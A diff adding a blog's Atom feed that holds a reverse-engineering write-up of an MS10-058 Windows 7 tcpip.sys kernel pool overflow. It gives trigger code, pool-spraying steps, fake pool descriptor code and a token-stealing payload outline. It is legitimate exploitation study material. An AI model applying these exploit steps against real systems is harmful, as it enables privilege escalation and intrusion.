@@ -1,0 +1,252 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom"><title>Diary of a reverse-engineer - Jeremy "__x86" Fetiveau</title><link href="/" rel="alternate"></link><link href="doar-e.github.io/feeds/author.jeremy-__x86-fetiveau.atom.xml" rel="self"></link><id>/</id><updated>2014-03-11T10:52:37+01:00</updated><entry><title>First dip into the kernel pool : MS10-058</title><link href="/blog/2014/03/11/first-dip-into-the-kernel-pool-ms10-058/" rel="alternate"></link><published>2014-03-11T10:52:37+01:00</published><updated>2014-03-11T10:52:37+01:00</updated><author><name>Jeremy "__x86" Fetiveau</name></author><id>tag:None,2014-03-11:/blog/2014/03/11/first-dip-into-the-kernel-pool-ms10-058/</id><summary type="html">&lt;h1 id="introduction"&gt;Introduction&lt;/h1&gt;
+&lt;p&gt;I am currently playing with pool-based memory corruption vulnerabilities. That’s why I wanted to program a PoC exploit for the vulnerability presented by Tarjei Mandt during his first talk “Kernel Pool Exploitation on Windows 7” &lt;a href="http://www.mista.nu/research/MANDT-kernelpool-PAPER.pdf"&gt;[3]&lt;/a&gt;. I think it's a good exercise to start learning about pool overflows.&lt;/p&gt;
+</summary><content type="html">&lt;h1 id="introduction"&gt;Introduction&lt;/h1&gt;
+&lt;p&gt;I am currently playing with pool-based memory corruption vulnerabilities. That’s why I wanted to program a PoC exploit for the vulnerability presented by Tarjei Mandt during his first talk “Kernel Pool Exploitation on Windows 7” &lt;a href="http://www.mista.nu/research/MANDT-kernelpool-PAPER.pdf"&gt;[3]&lt;/a&gt;. I think it's a good exercise to start learning about pool overflows.&lt;/p&gt;
+
+
+&lt;div class="toc"&gt;&lt;span class="toctitle"&gt;Table of contents:&lt;/span&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a href="#introduction"&gt;Introduction&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#forewords"&gt;Forewords&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#triggering-the-flaw"&gt;Triggering the flaw&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#spraying-the-pool"&gt;Spraying the pool&lt;/a&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a href="#non-paged-objects"&gt;Non paged objects&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#ntpoolhittag"&gt;nt!PoolHitTag&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a href="#exploitation-technique"&gt;Exploitation technique&lt;/a&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a href="#basic-structure"&gt;Basic structure&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#poolindex-overwrite"&gt;PoolIndex overwrite&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#non-paged-pool-type"&gt;Non paged pool type&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#crafting-a-fake-pool-descriptor"&gt;Crafting a fake pool descriptor&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#notes"&gt;Notes&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a href="#payload-and-clean-up"&gt;Payload and clean-up&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#greetings"&gt;Greetings&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#conclusion"&gt;Conclusion&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#references"&gt;References&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/div&gt;
+&lt;h1 id="forewords"&gt;Forewords&lt;/h1&gt;
+&lt;p&gt;If you want to experiment with this vulnerability, you should read &lt;a href="http://www.itsecdb.com/oval/definition/oval/gov.nist.USGCB.patch/def/11689/MS10-058-Vulnerabilities-in-TCP-IP-Could-Allow-Elevation-of.html"&gt;[1]&lt;/a&gt; and be sure to have a vulnerable system. I tested my exploit on a VM with Windows 7 32 bits with tcpip.sys 6.1.7600.16385. The Microsoft bulletin dealing with this vulnerability is MS10-058. It has been found by Matthieu Suiche &lt;a href="http://technet.microsoft.com/fr-fr/security/bulletin/ms10-058"&gt;[2]&lt;/a&gt; and was used as an example on Tarjei Mandt’s paper &lt;a href="http://www.mista.nu/research/MANDT-kernelpool-PAPER.pdf"&gt;[3]&lt;/a&gt;.&lt;/p&gt;
+&lt;h1 id="triggering-the-flaw"&gt;Triggering the flaw&lt;/h1&gt;
+&lt;p&gt;An integer overflow in &lt;em&gt;tcpip!IppSortDestinationAddresses&lt;/em&gt; allows to allocate a wrong-sized non-paged pool memory chunk. Below you can see the diff between the vulnerable version and the patched version.&lt;/p&gt;
+&lt;p&gt;&lt;center&gt;&lt;img alt="diff.png" src="/images/MS10-058/diff.png"&gt;&lt;/center&gt;&lt;/p&gt;
+&lt;p&gt;So basically the flaw is merely an integer overflow that triggers a pool overflow. &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;IppSortDestinationAddresses(x,x,x)+29   imul    eax, 1Ch
+IppSortDestinationAddresses(x,x,x)+2C   push    esi
+IppSortDestinationAddresses(x,x,x)+2D   mov     esi, ds:__imp__ExAllocatePoolWithTag@12 
+IppSortDestinationAddresses(x,x,x)+33   push    edi
+IppSortDestinationAddresses(x,x,x)+34   mov     edi, 73617049h
+IppSortDestinationAddresses(x,x,x)+39   push    edi   
+IppSortDestinationAddresses(x,x,x)+3A   push    eax  
+IppSortDestinationAddresses(x,x,x)+3B   push    ebx           
+IppSortDestinationAddresses(x,x,x)+3C   call    esi ; ExAllocatePoolWithTag(x,x,x)
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;You can reach this code using a &lt;em&gt;WSAIoctl&lt;/em&gt; with the code &lt;em&gt;SIO_ADDRESS_LIST_SORT&lt;/em&gt; using a call like this :&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;WSAIoctl(sock, SIO_ADDRESS_LIST_SORT, pwn, 0x1000, pwn, 0x1000, &amp;amp;cb, NULL, NULL)
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;You have to pass the function a pointer to a &lt;em&gt;SOCKET_ADDRESS_LIST&lt;/em&gt; (&lt;em&gt;pwn&lt;/em&gt; in the example). This &lt;em&gt;SOCKET_ADDRESS_LIST&lt;/em&gt; contains an &lt;em&gt;iAddressCount&lt;/em&gt; field and &lt;em&gt;iAddressCount&lt;/em&gt; &lt;em&gt;SOCKET_ADDRESS&lt;/em&gt; structures. With a high &lt;em&gt;iAddressCount&lt;/em&gt; value, the integer will wrap, thus triggering the wrong-sized allocation.  We can almost write anything in those structures. There are only two limitations : &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;IppFlattenAddressList(x,x)+25   lea     ecx, [ecx+ebx*8]
+IppFlattenAddressList(x,x)+28   cmp     dword ptr [ecx+8], 1Ch
+IppFlattenAddressList(x,x)+2C   jz      short loc_4DCA9
+
+IppFlattenAddressList(x,x)+9C   cmp     word ptr [edx], 17h
+IppFlattenAddressList(x,x)+A0   jnz     short loc_4DCA2
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The copy will stop if those checks fail. That means that each &lt;em&gt;SOCKET_ADDRESS&lt;/em&gt; has a length of 0x1c and that each &lt;em&gt;SOCKADDR&lt;/em&gt; buffer pointed to by the socket address begins with a 0x17 byte. Long story short :&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Make the multiplication at &lt;em&gt;IppSortDestinationAddresses+29&lt;/em&gt; overflow&lt;/li&gt;
+&lt;li&gt;Get a non-paged pool chunk at &lt;em&gt;IppSortDestinationAddresses+3e&lt;/em&gt; that is too little&lt;/li&gt;
+&lt;li&gt;Write user controlled memory to this chunk in &lt;em&gt;IppFlattenAddressList+67&lt;/em&gt; and overflow as much as you want (provided that you take care of the 0x1c and 0x17 bytes)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;The code below should trigger a BSOD. Now the objective is to place an object after our vulnerable object and modify pool metadata. &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;WSADATA wd = {0};
+SOCKET sock = 0;
+SOCKET_ADDRESS_LIST *pwn = (SOCKET_ADDRESS_LIST*)malloc(sizeof(INT) + 4 * sizeof(SOCKET_ADDRESS));
+DWORD cb;
+
+memset(buffer,0x41,0x1c);
+buffer[0] = 0x17;
+buffer[1] = 0x00;
+sa.lpSockaddr = (LPSOCKADDR)buffer;
+sa.iSockaddrLength = 0x1c;
+pwn-&amp;gt;iAddressCount = 0x40000003;
+memcpy(&amp;amp;pwn-&amp;gt;Address[0],&amp;amp;sa,sizeof(_SOCKET_ADDRESS));
+memcpy(&amp;amp;pwn-&amp;gt;Address[1],&amp;amp;sa,sizeof(_SOCKET_ADDRESS));
+memcpy(&amp;amp;pwn-&amp;gt;Address[2],&amp;amp;sa,sizeof(_SOCKET_ADDRESS));
+memcpy(&amp;amp;pwn-&amp;gt;Address[3],&amp;amp;sa,sizeof(_SOCKET_ADDRESS));
+
+WSAStartup(MAKEWORD(2,0), &amp;amp;wd)
+sock = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);
+WSAIoctl(sock, SIO_ADDRESS_LIST_SORT, pwn, 0x1000, pwn, 0x1000, &amp;amp;cb, NULL, NULL)
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h1 id="spraying-the-pool"&gt;Spraying the pool&lt;/h1&gt;
+&lt;h2 id="non-paged-objects"&gt;Non paged objects&lt;/h2&gt;
+&lt;p&gt;There are several objects that we could easily use to manipulate the non-paged pool. For instance we could use semaphore objects or reserve objects.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;*8516b848 size:   48 previous size:   48  (Allocated) Sema 
+*85242d08 size:   68 previous size:   68  (Allocated) User 
+*850fcea8 size:   60 previous size:    8  (Allocated) IoCo
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We are trying to overflow a pool chunk with a size being a multiple of 0x1c. As 0x1c*3=0x54, the driver is going to request 0x54 bytes and being therefore given a chunk of 0x60 bytes. This is exactly the size of an I/O completion reserve object. To allocate a IoCo, we just need to call &lt;em&gt;NtAllocateReserveObject&lt;/em&gt; with the object type IOCO. To deallocate the IoCo, we could simply close the associate the handle. Doing this would make the object manager release the object. For more in-depth information about reserve objects, you can read j00ru’s article &lt;a href="http://magazine.hitb.org/issues/HITB-Ezine-Issue-003.pdf"&gt;[4]&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;In order to spray, we are first going to allocate a lot of IoCo without releasing them so as to fill existing holes in the pool. After that, we want to allocate IoCo and make holes of 0x60 bytes. This is illustrated in the &lt;em&gt;sprayIoCo()&lt;/em&gt; function of my PoC. Now we are able have an IoCo pool chunk following an Ipas pool chunk (as you might have noticed, ‘Ipas’ is the tag used by the tcpip driver). Therefore, we can easily corrupt its pool header.&lt;/p&gt;
+&lt;h2 id="ntpoolhittag"&gt;nt!PoolHitTag&lt;/h2&gt;
+&lt;p&gt;If you want to debug a specific call to &lt;em&gt;ExFreePoolWithTag&lt;/em&gt; and simply break on it you’ll see that there are way too much frees (and above all, this is very slow when kernel debugging). A simple approach to circumvent this issue is to use pool hit tags. &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;ExFreePoolWithTag(x,x)+62F                  and     ecx, 7FFFFFFFh
+ExFreePoolWithTag(x,x)+635                  mov     eax, ebx
+ExFreePoolWithTag(x,x)+637                  mov     ebx, ecx
+ExFreePoolWithTag(x,x)+639                  shl     eax, 3
+ExFreePoolWithTag(x,x)+63C                  mov     [esp+58h+var_28], eax
+ExFreePoolWithTag(x,x)+640                  mov     [esp+58h+var_2C], ebx
+ExFreePoolWithTag(x,x)+644                  cmp     ebx, _PoolHitTag
+ExFreePoolWithTag(x,x)+64A                  jnz     short loc_5180E9
+ExFreePoolWithTag(x,x)+64C                  int     3               ; Trap to Debugger
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;As you can see on the listing above, &lt;em&gt;nt!PoolHitTag&lt;/em&gt; is compared against the pool tag of the currently freed chunk. Notice the mask : it allows you to use the raw tag. (for instance ‘oooo’ instead of 0xef6f6f6f) By the way, you are not required to use the genuine tag. (eg : you can use ‘ooo’ for ‘IoCo’) Now you know that you can &lt;em&gt;ed nt!PoolHitTag ‘oooo’&lt;/em&gt; to debug your exploit.&lt;/p&gt;
+&lt;h1 id="exploitation-technique"&gt;Exploitation technique&lt;/h1&gt;
+&lt;h2 id="basic-structure"&gt;Basic structure&lt;/h2&gt;
+&lt;p&gt;As the internals of the pool are thoroughly detailed in Tarjei Mandt’s paper &lt;a href="http://www.mista.nu/research/MANDT-kernelpool-PAPER.pdf"&gt;[3]&lt;/a&gt;, I will only be giving a glimpse at the pool descriptor and the pool header structures. The pool memory is divided into several types of pool. Two of them are the paged pool and the non-paged pool. A pool is described by a &lt;em&gt;_POOL_DESCRIPTOR&lt;/em&gt; structure as seen below.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;0: kd&amp;gt; dt _POOL_TYPE
+ntdll!_POOL_TYPE
+   NonPagedPool = 0n0
+   PagedPool = 0n1
+0: kd&amp;gt; dt _POOL_DESCRIPTOR
+nt!_POOL_DESCRIPTOR
+   +0x000 PoolType         : _POOL_TYPE
+   +0x004 PagedLock        : _KGUARDED_MUTEX
+   +0x004 NonPagedLock     : Uint4B
+   +0x040 RunningAllocs    : Int4B
+   +0x044 RunningDeAllocs  : Int4B
+   +0x048 TotalBigPages    : Int4B
+   +0x04c ThreadsProcessingDeferrals : Int4B
+   +0x050 TotalBytes       : Uint4B
+   +0x080 PoolIndex        : Uint4B
+   +0x0c0 TotalPages       : Int4B
+   +0x100 PendingFrees     : Ptr32 Ptr32 Void
+   +0x104 PendingFreeDepth : Int4B
+   +0x140 ListHeads        : [512] _LIST_ENTRY
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;A pool descriptor references free memory in a free list called &lt;em&gt;ListHeads&lt;/em&gt;. The &lt;em&gt;PendingFrees&lt;/em&gt; field references chunks of memory waiting to be freed to the free list. Pointers to pool descriptor structures are stored in arrays such as &lt;em&gt;PoolVector&lt;/em&gt; (non-paged) or &lt;em&gt;ExpPagedPoolDescriptor&lt;/em&gt; (paged). Each chunk of memory contains a header before the actual data. This is the &lt;em&gt;_POOL_HEADER&lt;/em&gt;. It brings information such as the size of the block or the pool it belongs to.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;0: kd&amp;gt; dt _POOL_HEADER
+nt!_POOL_HEADER
+   +0x000 PreviousSize     : Pos 0, 9 Bits
+   +0x000 PoolIndex        : Pos 9, 7 Bits
+   +0x002 BlockSize        : Pos 0, 9 Bits
+   +0x002 PoolType         : Pos 9, 7 Bits
+   +0x000 Ulong1           : Uint4B
+   +0x004 PoolTag          : Uint4B
+   +0x004 AllocatorBackTraceIndex : Uint2B
+   +0x006 PoolTagHash      : Uint2B
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h2 id="poolindex-overwrite"&gt;PoolIndex overwrite&lt;/h2&gt;
+&lt;p&gt;The basic idea of this attack is to corrupt the &lt;em&gt;PoolIndex&lt;/em&gt; field of a pool header. This field is used when deallocating paged pool chunks in order to know which pool descriptor it belongs to. It is used as an index in an array of pointers to pool descriptors. Thus, if an attacker is able to corrupt it, he can make the pool manager believe that a specific chunk belongs to another pool descriptor. For instance, one could reference a pool descriptor out of the bounds of the array. &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;0: kd&amp;gt; dd ExpPagedPoolDescriptor
+82947ae0  84835000 84836140 84837280 848383c0
+82947af0  84839500 00000000 00000000 00000000
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;As there are always some null pointers after the array, it could be used to craft a fake pool descriptor in a user-allocated null page. &lt;/p&gt;
+&lt;h2 id="non-paged-pool-type"&gt;Non paged pool type&lt;/h2&gt;
+&lt;p&gt;To determine the &lt;em&gt;_POOL_DESCRIPTOR&lt;/em&gt; to use, &lt;em&gt;ExFreePoolWithTag&lt;/em&gt; gets the appropriate &lt;em&gt;_POOL_HEADER&lt;/em&gt; and stores &lt;em&gt;PoolType&lt;/em&gt; (&lt;em&gt;watchMe&lt;/em&gt;) and &lt;em&gt;BlockSize&lt;/em&gt; (&lt;em&gt;var_3c&lt;/em&gt;)&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;ExFreePoolWithTag(x,x)+465
+ExFreePoolWithTag(x,x)+465  loc_517F01:
+ExFreePoolWithTag(x,x)+465  mov     edi, esi
+ExFreePoolWithTag(x,x)+467  movzx   ecx, word ptr [edi-6]
+ExFreePoolWithTag(x,x)+46B  add     edi, 0FFFFFFF8h
+ExFreePoolWithTag(x,x)+46E  movzx   eax, cx
+ExFreePoolWithTag(x,x)+471  mov     ebx, eax
+ExFreePoolWithTag(x,x)+473  shr     eax, 9
+ExFreePoolWithTag(x,x)+476  mov     esi, 1FFh
+ExFreePoolWithTag(x,x)+47B  and     ebx, esi
+ExFreePoolWithTag(x,x)+47D  mov     [esp+58h+var_40], eax
+ExFreePoolWithTag(x,x)+481  and     eax, 1
+ExFreePoolWithTag(x,x)+484  mov     edx, 400h
+ExFreePoolWithTag(x,x)+489  mov     [esp+58h+var_3C], ebx
+ExFreePoolWithTag(x,x)+48D  mov     [esp+58h+watchMe], eax
+ExFreePoolWithTag(x,x)+491  test    edx, ecx
+ExFreePoolWithTag(x,x)+493  jnz     short loc_517F49
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Later, if &lt;em&gt;ExpNumberOfNonPagedPools&lt;/em&gt; equals 1, the correct pool descriptor will directly be taken from &lt;em&gt;nt!PoolVector[0]&lt;/em&gt;. The PoolIndex is not used. &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;ExFreePoolWithTag(x,x)+5C8  loc_518064:
+ExFreePoolWithTag(x,x)+5C8  mov     eax, [esp+58h+watchMe]
+ExFreePoolWithTag(x,x)+5CC  mov     edx, _PoolVector[eax*4]
+ExFreePoolWithTag(x,x)+5D3  mov     [esp+58h+var_48], edx
+ExFreePoolWithTag(x,x)+5D7  mov     edx, [esp+58h+var_40]
+ExFreePoolWithTag(x,x)+5DB  and     edx, 20h
+ExFreePoolWithTag(x,x)+5DE  mov     [esp+58h+var_20], edx
+ExFreePoolWithTag(x,x)+5E2  jz      short loc_5180B6
+
+
+ExFreePoolWithTag(x,x)+5E8  loc_518084:
+ExFreePoolWithTag(x,x)+5E8  cmp     _ExpNumberOfNonPagedPools, 1
+ExFreePoolWithTag(x,x)+5EF  jbe     short loc_5180CB
+
+ExFreePoolWithTag(x,x)+5F1  movzx   eax, word ptr [edi]
+ExFreePoolWithTag(x,x)+5F4  shr     eax, 9
+ExFreePoolWithTag(x,x)+5F7  mov     eax, _ExpNonPagedPoolDescriptor[eax*4]
+ExFreePoolWithTag(x,x)+5FE  jmp     short loc_5180C7
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Therefore, you have to make the pool manager believe that the chunk is located in paged memory. &lt;/p&gt;
+&lt;h2 id="crafting-a-fake-pool-descriptor"&gt;Crafting a fake pool descriptor&lt;/h2&gt;
+&lt;p&gt;As we want a fake pool descriptor at null address. We just allocate this page and put a fake deferred free list and a fake ListHeads.&lt;/p&gt;
+&lt;p&gt;When freeing a chunk, if the deferred freelist contains at least 0x20 entries, &lt;em&gt;ExFreePoolWithTag&lt;/em&gt; is going to actually free those chunks and put them on the appropriate entries of the &lt;em&gt;ListHeads&lt;/em&gt;. &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PCHAR&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="mh"&gt;0x100&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PCHAR&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="mh"&gt;0x1208&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; 
+&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PCHAR&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="mh"&gt;0x104&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PCHAR&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="mh"&gt;0x20&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0x140&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="mh"&gt;0x1140&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PCHAR&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PCHAR&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;WriteAddress&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PINT&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="mh"&gt;0x1200&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;INT&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="mh"&gt;0x060c0a00&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PINT&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="mh"&gt;0x1204&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;INT&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="mh"&gt;0x6f6f6f6f&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PCHAR&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="mh"&gt;0x1208&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PCHAR&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="mh"&gt;0x0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PINT&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="mh"&gt;0x1260&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;INT&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="mh"&gt;0x060c0a0c&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PINT&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="mh"&gt;0x1264&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;INT&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="mh"&gt;0x6f6f6f6f&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h2 id="notes"&gt;Notes&lt;/h2&gt;
+&lt;p&gt;It is interesting to note that this attack would not work with modern mitigations. Here are a few reasons : &lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Validation of the &lt;em&gt;PoolIndex&lt;/em&gt; field&lt;/li&gt;
+&lt;li&gt;Prevention of the null page allocation&lt;/li&gt;
+&lt;li&gt;&lt;em&gt;NonPagedPoolNX&lt;/em&gt; has been introduced with Windows 8 and should be used instead of the &lt;em&gt;NonPagedPool&lt;/em&gt; type. &lt;/li&gt;
+&lt;li&gt;SMAP would prevent access to userland data&lt;/li&gt;
+&lt;li&gt;SMEP would prevent execution of userland code &lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id="payload-and-clean-up"&gt;Payload and clean-up&lt;/h1&gt;
+&lt;p&gt;A classical target for write-what-where scenarios is the &lt;em&gt;HalDispatchTable&lt;/em&gt;. We just have to overwrite &lt;em&gt;HalDispatchTable+4&lt;/em&gt; with a pointer to our payload which is &lt;em&gt;setupPayload()&lt;/em&gt;. When we are done, we just have to put back the pointer to &lt;em&gt;hal!HaliQuerySystemInformation&lt;/em&gt;. (otherwise you can expect some crashes)&lt;/p&gt;
+&lt;p&gt;Now that we are able to execute arbitrary code from kernel land we just have to get the &lt;em&gt;_EPROCESS&lt;/em&gt; of the attacking process with &lt;em&gt;PsGetCurrentProcess()&lt;/em&gt; and walk the list of processes using the &lt;em&gt;ActiveProcessLinks&lt;/em&gt; field until we encounter a process with &lt;em&gt;ImageFileName&lt;/em&gt; equal to “System”. Then we just replace the access token of the attacker process by the one of the system process. Note that the lazy author of this exploit hardcoded several offsets :).&lt;/p&gt;
+&lt;p&gt;This is illustrated in &lt;em&gt;payload()&lt;/em&gt;. &lt;/p&gt;
+&lt;p&gt;&lt;center&gt;&lt;img alt="screenshot.png" src="/images/MS10-058/screenshot.png"&gt;&lt;/center&gt;&lt;/p&gt;
+&lt;h1 id="greetings"&gt;Greetings&lt;/h1&gt;
+&lt;p&gt;Special thanks to my friend &lt;a href="https://twitter.com/0vercl0k"&gt;@0vercl0k&lt;/a&gt; for his review and help!&lt;/p&gt;
+&lt;h1 id="conclusion"&gt;Conclusion&lt;/h1&gt;
+&lt;p&gt;I hope you enjoyed this article. If you want to know more about the topic, check out the latest papers of Tarjei Mandt, Zhenhua Liu and Nikita Tarakanov. (or wait for other articles ;) )&lt;/p&gt;
+&lt;p&gt;You can find my code on my new github &lt;a href="https://github.com/JeremyFetiveau/Exploits/blob/master/MS10-058.cpp"&gt;[5]&lt;/a&gt;. Don’t hesitate to share comments on my article or my exploit if you see something wrong :)&lt;/p&gt;
+&lt;h1 id="references"&gt;References&lt;/h1&gt;
+&lt;p&gt;[1] &lt;a href="http://www.itsecdb.com/oval/definition/oval/gov.nist.USGCB.patch/def/11689/MS10-058-Vulnerabilities-in-TCP-IP-Could-Allow-Elevation-of.html"&gt;Vulnerability details on itsecdb&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;[2] &lt;a href="http://technet.microsoft.com/fr-fr/security/bulletin/ms10-058"&gt;MS bulletin&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;[3] &lt;a href="http://www.mista.nu/research/MANDT-kernelpool-PAPER.pdf"&gt;Kernel Pool Exploitation on Windows 7&lt;/a&gt; - Tarjei Mandt's paper. A must-read!&lt;/p&gt;
+&lt;p&gt;[4] &lt;a href="http://magazine.hitb.org/issues/HITB-Ezine-Issue-003.pdf"&gt;Reserve Objects in Windows 7&lt;/a&gt; - Great j00ru's article!&lt;/p&gt;
